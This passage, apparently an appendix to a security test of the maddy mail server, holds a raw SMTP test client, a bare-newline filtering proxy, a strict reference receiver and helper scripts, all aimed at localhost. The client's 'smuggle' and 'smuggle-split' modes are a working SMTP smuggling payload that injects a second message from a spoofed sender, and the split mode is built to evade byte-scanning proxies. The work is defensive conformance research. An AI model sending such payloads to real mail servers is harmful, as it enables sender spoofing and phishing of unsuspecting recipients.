            b"..leading-double-dot should un-stuff to one dot" + CRLF +
            b"...three dots become two" + CRLF +
            b"normal line" + CRLF)
    c.send(body, "C->S body (dot-stuffed leading dots)")
    c.send(b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C 250?")
    c.send(b"QUIT" + CRLF); c.recv_all()

def resembles(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    body = (b"From: sender@example.com" + CRLF +
            b"To: rcpt@example.com" + CRLF +
            b"Subject: framing probe" + CRLF + CRLF +
            b" ." + CRLF +
            b".not-a-terminator" + CRLF +
            b"embedded . dot in middle" + CRLF +
            b"trailing dot." + CRLF)
    c.send(body, "C->S body (lines resembling terminator)")
    c.send(b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C 250?")
    c.send(b"QUIT" + CRLF); c.recv_all()

def smuggle_payload():
    return (
        b"EHLO client.test" + CRLF +
        b"MAIL FROM:<legit@example.com>" + CRLF +
        b"RCPT TO:<rcpt@example.com>" + CRLF +
        b"DATA" + CRLF +
        b"Subject: first (legit) message" + CRLF + CRLF +
        b"This is the visible first message body." + LF +
        b"." + LF +
        b"MAIL FROM:<SPOOFED-attacker@evil.example>" + CRLF +
        b"RCPT TO:<victim@example.com>" + CRLF +
        b"DATA" + CRLF +
        b"Subject: SMUGGLED second message" + CRLF + CRLF +
        b"This body was smuggled past the DATA boundary." + CRLF +
        b"." + CRLF
    )

def smuggle(c):
    # ONE send(): txn1 ends with bare-LF <LF>.<LF>, then pipelined txn2 with SPOOFED sender.
    c.recv_all("S->C greeting")
    c.send(smuggle_payload(), "C->S ONE pipelined send() (smuggling)")
    c.recv_all("S->C all replies", settle=1.5)
    c.send(b"QUIT" + CRLF); c.recv_all()

def smuggle_split(c):
    # Same payload as smuggle, but split into TWO sends at a boundary BEFORE the first bare LF,
    # with a pause, so a byte-scanning front proxy sees the offending LF only in the 2nd chunk.
    c.recv_all("S->C greeting")
    p = smuggle_payload()
    idx = p.index(b"\n")               # first LF in payload
    # find first BARE LF (an LF not preceded by CR)
    i = 0; bare = None
    while i < len(p):
        j = p.index(b"\n", i)
        if j == 0 or p[j-1:j] != b"\r":
            bare = j; break
        i = j + 1
    split = bare                        # split right before the first bare LF
    c.send(p[:split], "C->S chunk 1 (up to just before first bare LF, %d bytes)" % split)
    time.sleep(0.5)
    c.send(p[split:], "C->S chunk 2 (starts with the bare LF)")
    c.recv_all("S->C all replies", settle=1.5)
    c.send(b"QUIT" + CRLF); c.recv_all()

def dropmid(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    c.send(b"Subject: will be dropped" + CRLF + CRLF + b"partial body with no terminator" + CRLF,
           "C->S partial body then DROP (no terminator)")
    time.sleep(0.3)
    c.close()
    sys.stdout.write("[C->S] connection closed mid-DATA (no <CRLF>.<CRLF> sent)\n"); sys.stdout.flush()

def longline(c):
    # one line far exceeding MaxLineLength (2000), sent in ONE send() so it arrives as one read.
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    c.send(b"Subject: long line probe" + CRLF + CRLF, "C->S header")
    longln = b"X" * 5000 + CRLF
    c.send_raw(longln, "C->S over-long line (5000 X, one send)")
    c.send(b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C reply", settle=1.5)
    c.send(b"QUIT" + CRLF); c.recv_all()

def longline_split(c):
    # SAME logical >2000 line, but sent as five 1000-byte chunks with pauses so each arrives
    # in a SEPARATE read (lineLimitReader.Read has a VALUE receiver -> curLineLength resets/read).
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    c.send(b"Subject: long line split probe" + CRLF + CRLF, "C->S header")
    for k in range(5):
        c.send_raw(b"X" * 1000, "C->S long-line chunk %d/5 (1000 X, no CRLF)" % (k+1))
        time.sleep(0.4)
    c.send_raw(CRLF, "C->S end the long line (CRLF)")
    c.send(b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C reply", settle=1.5)
    c.send(b"QUIT" + CRLF); c.recv_all()

def oversize(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    c.send(b"MAIL FROM:<sender@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    c.send(b"Subject: oversize probe" + CRLF + CRLF, "C->S header")
    chunk = (b"A" * 60 + CRLF) * 90   # ~5580 bytes > 2K limit
    c.send_raw(chunk, "C->S oversize body (~5.5 KB)")
    c.send(b"." + CRLF, "C->S end-of-DATA terminator (canonical)")
    c.recv_all("S->C reply", settle=1.5)
    c.send(b"QUIT" + CRLF); c.recv_all()

def posterror(c):
    # Post-error same-connection probe (Q6 lingering-state): a failing oversize txn (552) then a
    # normal txn on the SAME connection, WITHOUT re-EHLO -> proves envelope reset + HELO persists.
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    # txn 1: oversize -> 552
    c.send(b"MAIL FROM:<first@example.com>" + CRLF); c.recv_all()
    c.send(b"RCPT TO:<rcpt@example.com>" + CRLF); c.recv_all()
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
    c.send(b"Subject: oversize (will 552)" + CRLF + CRLF, "C->S header txn1")
    c.send_raw((b"A" * 60 + CRLF) * 90, "C->S oversize body txn1 (~5.5 KB)")
    c.send(b"." + CRLF, "C->S terminator txn1")
    c.recv_all("S->C reply txn1 (expect 552)", settle=1.2)
    # txn 2: normal on SAME connection, NO re-EHLO
    c.send(b"MAIL FROM:<second@example.com>" + CRLF); c.recv_all("S->C txn2 MAIL reply")
    c.send(b"RCPT TO:<rcpt2@example.com>" + CRLF); c.recv_all("S->C txn2 RCPT reply")
    c.send(b"DATA" + CRLF); c.recv_all("S->C 354 txn2")
    c.send(b"Subject: normal after error" + CRLF + CRLF + b"small body ok" + CRLF, "C->S body txn2")
    c.send(b"." + CRLF, "C->S terminator txn2")
    c.recv_all("S->C reply txn2 (expect 250)", settle=1.2)
    c.send(b"QUIT" + CRLF); c.recv_all()

def backtoback(c):
    c.recv_all("S->C greeting")
    c.send(b"EHLO client.test" + CRLF); c.recv_all()
    for i in (1, 2, 3):
        c.send(b"MAIL FROM:<sender%d@example.com>" % i + CRLF); c.recv_all()
        c.send(b"RCPT TO:<rcpt%d@example.com>" % i + CRLF); c.recv_all()
        c.send(b"DATA" + CRLF); c.recv_all("S->C 354")
        body = (b"Subject: back-to-back message %d" % i + CRLF + CRLF +
                b"Body of message %d on the same connection." % i + CRLF)
        c.send(body, "C->S body msg %d" % i)
        c.send(b"." + CRLF, "C->S terminator msg %d" % i)
        c.recv_all("S->C 250 msg %d" % i)
    c.send(b"QUIT" + CRLF); c.recv_all()

MODES = {
    "canonical": canonical, "barelf": barelf, "barelf-body": barelf_body,
    "dotstuff": dotstuff, "resembles": resembles, "smuggle": smuggle,
    "smuggle-split": smuggle_split, "dropmid": dropmid, "longline": longline,
    "longline-split": longline_split, "oversize": oversize, "posterror": posterror,
    "backtoback": backtoback,
}

if __name__ == "__main__":
    if MODE not in MODES:
        sys.stderr.write("unknown mode %r; valid: %s\n" % (MODE, ",".join(sorted(MODES)))); sys.exit(2)
    sys.stdout.write("### rawclient mode=%s target=%s:%d\n" % (MODE, HOST, PORT)); sys.stdout.flush()
    c = Client(HOST, PORT)
    try:
        MODES[MODE](c)
    finally:
        c.close()
    sys.stdout.write("### rawclient done (mode=%s)\n" % MODE); sys.stdout.flush()
```

### 7.5 Front proxy (normalize / reject / passthrough; validates mode; handles bare CR and bare LF) — `/tmp/maddy-smtp/proxy.py`
```python
#!/usr/bin/env python3
# Small instrumented TCP front proxy (stdlib socket/selectors/threading only).
# Listens on 127.0.0.1:<lport>, forwards to maddy 127.0.0.1:<rport>, in three modes:
#   normalize  : rewrite bare '\n' (LF not preceded by CR) to '\r\n' on the client->server
#                stream before forwarding (the "clean" analogue; can MANUFACTURE a canonical
#                <CRLF>.<CRLF> boundary out of ambiguous bare-LF framing).
#   reject     : fully CRLF-strict. On the FIRST bare '\n' (LF not preceded by CR) OR bare
#                '\r' (CR not followed by LF) in the client->server stream, emit a 5xx to the
#                client and close WITHOUT forwarding the offending chunk or any later bytes.
#   passthrough: forward verbatim (control).
# Instrumentation: logs every client->server chunk with its absolute byte-offset range, whether
# it was forwarded or rejected, the exact rejection offset+kind, and the forwarded-prefix length.
# Hardening: explicit mode validation (fail-fast), socket deadlines, guaranteed socket cleanup.
import socket, sys, threading, selectors, os

MODE  = sys.argv[1] if len(sys.argv) > 1 else "normalize"
LPORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2524
RHOST = sys.argv[3] if len(sys.argv) > 3 else "127.0.0.1"
RPORT = int(sys.argv[4]) if len(sys.argv) > 4 else 2525
PROXY_LOG = sys.argv[5] if len(sys.argv) > 5 else "/tmp/maddy-smtp/proxy.log"

VALID_MODES = ("normalize", "reject", "passthrough")
if MODE not in VALID_MODES:                      # fail-fast (finding 14)
    sys.stderr.write("proxy: invalid mode %r; valid: %s\n" % (MODE, ",".join(VALID_MODES)))
    sys.exit(2)

_loglock = threading.Lock()
def plog(msg):
    line = "proxy[%s pid=%d] %s" % (MODE, os.getpid(), msg)
    with _loglock:
        sys.stderr.write(line + "\n"); sys.stderr.flush()
        with open(PROXY_LOG, "a") as f:
            f.write(line + "\n")

def vis(b: bytes) -> str:
    out = []
    for by in b:
        if by == 0x0d: out.append("<CR>")
        elif by == 0x0a: out.append("<LF>")
        elif by == 0x09: out.append("<TAB>")
        elif 32 <= by < 127: out.append(chr(by))
        else: out.append("\\x%02x" % by)
    return "".join(out)

def normalize_bare_lf(data: bytes, prev_cr: bool):
    out = bytearray()
    for by in data:
        if by == 0x0a and not prev_cr:
            out += b"\r\n"
        else:
            out.append(by)
        prev_cr = (by == 0x0d)
    return bytes(out), prev_cr

def scan_bare(data: bytes, base: int, pend_cr_off):
    # Detect first bare LF (LF not preceded by CR) or bare CR (CR not followed by LF).
    # pend_cr_off: absolute offset of a CR at the end of a previous chunk awaiting its LF, or None.
    i = 0; n = len(data)
    while i < n:
        b = data[i]
        if pend_cr_off is not None:
            if b == 0x0a:
                pend_cr_off = None; i += 1; continue
            return pend_cr_off, "bare CR", base + n, None
        if b == 0x0d:
            pend_cr_off = base + i; i += 1; continue
        if b == 0x0a:
            return base + i, "bare LF", base + n, None
        i += 1
    return None, None, base + n, pend_cr_off

def handle(client, cid):
    peer = "%s:%d" % client.getpeername()
    plog("conn #%d from %s -> upstream %s:%d" % (cid, peer, RHOST, RPORT))
    try:
        upstream = socket.create_connection((RHOST, RPORT), timeout=10)
    except OSError:
        client.sendall(b"421 proxy cannot reach upstream\r\n"); client.close(); return
    client.settimeout(30.0); upstream.settimeout(30.0)
    sel = selectors.DefaultSelector()
    sel.register(client, selectors.EVENT_READ, "c")
    sel.register(upstream, selectors.EVENT_READ, "u")
    c2s_off = 0            # absolute offset in client->server stream
    fwd_prefix = 0         # bytes forwarded to maddy before any rejection
    pend_cr_off = None
    prev_cr = False
    alive = True
    try:
        while alive:
            for key, _ in sel.select(timeout=5):
                sock = key.fileobj; who = key.data
                try:
                    data = sock.recv(4096)
                except OSError:
                    alive = False; break
                if not data:
                    alive = False; break
                if who == "c":
                    start = c2s_off; end = c2s_off + len(data)
                    if MODE == "reject":
                        viol, kind, newbase, pend_cr_off = scan_bare(data, c2s_off, pend_cr_off)
                        if viol is not None:
                            plog("c->s bytes [%d..%d) REJECTED (%s at offset %d); NOT forwarded: %s"
                                 % (start, end, kind, viol, vis(data)))
                            plog("REJECTION: kind=%s offset=%d forwarded_prefix_bytes=%d" % (kind, viol, fwd_prefix))
                            client.sendall(b"500 5.5.2 bare newline rejected by front proxy (RFC 5321 requires CRLF)\r\n")
                            alive = False; break
                        upstream.sendall(data); fwd_prefix += len(data); c2s_off = end
                        plog("c->s bytes [%d..%d) clean, FORWARDED (%d): %s" % (start, end, len(data), vis(data)))
                    elif MODE == "normalize":
                        conv, prev_cr = normalize_bare_lf(data, prev_cr)
                        upstream.sendall(conv); c2s_off = end
                        plog("c->s bytes [%d..%d) NORMALIZED in=%d out=%d: in=%s | out=%s"
                             % (start, end, len(data), len(conv), vis(data), vis(conv)))
                    else:
                        upstream.sendall(data); c2s_off = end
                        plog("c->s bytes [%d..%d) passthrough: %s" % (start, end, vis(data)))
                else:
                    client.sendall(data)
                    plog("s->c %d bytes verbatim: %s" % (len(data), vis(data)))
    finally:                                        # guaranteed cleanup (finding 14)
        try: sel.close()
        except Exception: pass
        for s in (upstream, client):
            try: s.close()
            except OSError: pass
        plog("conn #%d closed (forwarded_prefix_bytes=%d)" % (cid, fwd_prefix))

def main():
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", LPORT)); ls.listen(16)
    plog("listening 127.0.0.1:%d -> %s:%d (log=%s)" % (LPORT, RHOST, RPORT, PROXY_LOG))
    cid = 0
    try:
        while True:
            conn, _ = ls.accept(); cid += 1
            threading.Thread(target=handle, args=(conn, cid), daemon=True).start()
    finally:
        try: ls.close()
        except OSError: pass

if __name__ == "__main__":
    main()
```

### 7.6 RFC-strict reference receiver (Q3 strict-peer contrast) — `/tmp/maddy-smtp/strictpeer.py`
```python
#!/usr/bin/env python3
# RFC-5321-STRICT reference SMTP receiver (stdlib raw sockets only).
# Purpose: a concrete, named strict peer for the Q3 conformance contrast. Unlike maddy's
# upstream (Go stdlib dotReader), this receiver treats ONLY the canonical 5-octet sequence
# <CRLF>.<CRLF> as end-of-mail-data (RFC 5321 4.1.1.4). A bare-LF <LF>.<LF> is ordinary body
# content and does NOT terminate DATA. It unstuffs leading dots (RFC 5321 4.5.2).
# It reports, per connection, how many messages it accepted and each delivered body.
import socket, socketserver, sys, threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 2527
MAXB = 64 * 1024 * 1024
TMO  = 30.0

def vis(b: bytes) -> str:
    out = []
    for by in b:
        if by == 0x0d: out.append("<CR>")
        elif by == 0x0a: out.append("<LF>\n")
        elif 32 <= by < 127: out.append(chr(by))
        else: out.append("\\x%02x" % by)
    return "".join(out)

class Handler(socketserver.BaseRequestHandler):
    def send(self, s): self.request.sendall(s if isinstance(s, bytes) else s.encode())
    def readline(self, buf):
        while b"\r\n" not in buf[0]:
            if len(buf[0]) > MAXB: return None
            ch = self.request.recv(4096)
            if not ch: return None
            buf[0] += ch
        line, _, rest = buf[0].partition(b"\r\n"); buf[0] = rest
        return line + b"\r\n"
    def read_data_strict(self, buf):
        # STRICT: terminate ONLY on canonical <CRLF>.<CRLF> (or a leading ".\r\n").
        data = b""
        while True:
            if buf[0]:
                data += buf[0]; buf[0] = b""
            if data == b".\r\n" or data.endswith(b"\r\n.\r\n"):
                break
            if len(data) > MAXB: break
            ch = self.request.recv(4096)
            if not ch: break
            data += ch
        if data.endswith(b"\r\n.\r\n"): body = data[:-3]
        elif data == b".\r\n": body = b""
        else: body = data
        out = bytearray(); i = 0; atbol = True
        while i < len(body):
            c = body[i]
            if atbol and c == 0x2e and i + 1 < len(body):
                i += 1; atbol = False; continue
            out.append(c); atbol = (c == 0x0a); i += 1
        return bytes(out)
    def handle(self):
        peer = "%s:%d" % self.client_address
        count = 0
        try:
            self.request.settimeout(TMO)
            self.send("220 strictpeer.local ESMTP RFC5321-strict\r\n")
            buf = [b""]; mail_from = None; rcpts = []
            while True:
                line = self.readline(buf)
                if line is None: break
                up = line.rstrip(b"\r\n").upper(); cmd = line.rstrip(b"\r\n").decode("latin1")
                if up.startswith(b"EHLO") or up.startswith(b"HELO"):
                    self.send("250-strictpeer.local\r\n250 PIPELINING\r\n")
                elif up.startswith(b"MAIL FROM"):
                    mail_from = cmd; rcpts = []; self.send("250 2.1.0 Ok\r\n")
                elif up.startswith(b"RCPT TO"):
                    rcpts.append(cmd); self.send("250 2.1.5 Ok\r\n")
                elif up.startswith(b"DATA"):
                    self.send("354 End data with <CR><LF>.<CR><LF>\r\n")
                    body = self.read_data_strict(buf); count += 1
                    smug = b"SPOOFED" in body
                    print("========== STRICT-PEER MESSAGE #%d from %s ==========" % (count, peer))
                    print("ENVELOPE %s" % (mail_from or "(none)"))
                    for r in rcpts: print("ENVELOPE %s" % r)
                    print("--- body (%d bytes) — bare-LF <LF>.<LF> treated as BODY, not terminator ---" % len(body))
                    print(vis(body))
                    print("--- smuggled 'MAIL FROM:<SPOOFED...>' present IN BODY as text? %s ---" % ("YES" if smug else "no"))
                    sys.stdout.flush()
                    self.send("250 2.0.0 Ok: strict-queued\r\n")
                    mail_from = None; rcpts = []
                elif up.startswith(b"QUIT"):
                    self.send("221 2.0.0 Bye\r\n"); break
                elif up.startswith(b"RSET"):
                    mail_from = None; rcpts = []; self.send("250 Ok\r\n")
                else:
                    self.send("250 Ok\r\n")
        except (socket.timeout, OSError):
            pass
        finally:
            print(">>> STRICT-PEER accepted %d message(s) on connection from %s" % (count, peer)); sys.stdout.flush()
            try: self.request.close()
            except OSError: pass

class Srv(socketserver.ThreadingTCPServer):
    allow_reuse_address = True; daemon_threads = True

if __name__ == "__main__":
    with Srv(("127.0.0.1", PORT), Handler) as s:
        sys.stderr.write("strictpeer listening on 127.0.0.1:%d\n" % PORT); sys.stderr.flush()
        s.serve_forever()
```

### 7.7 Shell helpers (port-readiness / freedom gates used in the lifecycle transcripts) — `/tmp/maddy-smtp/lib.sh`
```bash
# helper: wait until a 127.0.0.1 port accepts a connection (readiness), or fail after ~5s
wait_port() {
  local port="$1" i=0
  while [ $i -lt 50 ]; do
    if python3 -c "import socket,sys; s=socket.socket(); s.settimeout(0.2)
try:
    s.connect(('127.0.0.1',$port)); s.close()
except OSError: sys.exit(1)" 2>/dev/null; then
      echo "port $port ready"; return 0
    fi
    i=$((i+1)); sleep 0.1
  done
  echo "port $port NOT ready after 5s"; return 1
}
port_free() {
  local port="$1"
  if python3 -c "import socket,sys; s=socket.socket(); s.settimeout(0.2)
try:
    s.connect(('127.0.0.1',$port)); s.close(); sys.exit(0)
except OSError: sys.exit(1)" 2>/dev/null; then
    echo "port $port STILL IN USE"; return 1
  else
    echo "port $port free"; return 0
  fi
}

# run_exp <name> <mode> [host] [port] : run rawclient, capture client/maddy/sink deltas
run_exp() {
  local name="$1" mode="$2" host="${3:-127.0.0.1}" port="${4:-2525}"
  local ml sl
  ml=$(wc -l < /tmp/maddy-smtp/maddy.log)
  sl=$(wc -l < /tmp/maddy-smtp/sink_delivered.log)
  python3 /tmp/maddy-smtp/rawclient.py "$mode" "$host" "$port" > "/tmp/maddy-smtp/evidence/${name}.client" 2>&1
  sleep 0.8
  tail -n +$((ml+1)) /tmp/maddy-smtp/maddy.log > "/tmp/maddy-smtp/evidence/${name}.maddy"
  tail -n +$((sl+1)) /tmp/maddy-smtp/sink_delivered.log > "/tmp/maddy-smtp/evidence/${name}.sink"
  echo "[$name] client=$(wc -l < /tmp/maddy-smtp/evidence/${name}.client)L maddy=$(wc -l < /tmp/maddy-smtp/evidence/${name}.maddy)L sink=$(wc -l < /tmp/maddy-smtp/evidence/${name}.sink)L"
}
```

### 7.8 Delivered-message extractor (per-message `.bin` at the sink) — `/tmp/maddy-smtp/extract_msg.py`
```python
# Extract the message portion (from "From:" onward) of a delivered .bin, excluding the
# variable Received header, and print sha256 + length. Usage: extract_msg.py <bin> [outbin]
import sys, hashlib
data = open(sys.argv[1], "rb").read()
idx = data.find(b"\r\nFrom:")
portion = (b"From:" + data.split(b"\r\nFrom:", 1)[1]) if idx >= 0 else data
if len(sys.argv) > 2:
    open(sys.argv[2], "wb").write(portion)
print("%s  %d bytes  %s" % (hashlib.sha256(portion).hexdigest(), len(portion), sys.argv[1].split("/")[-1]))
```
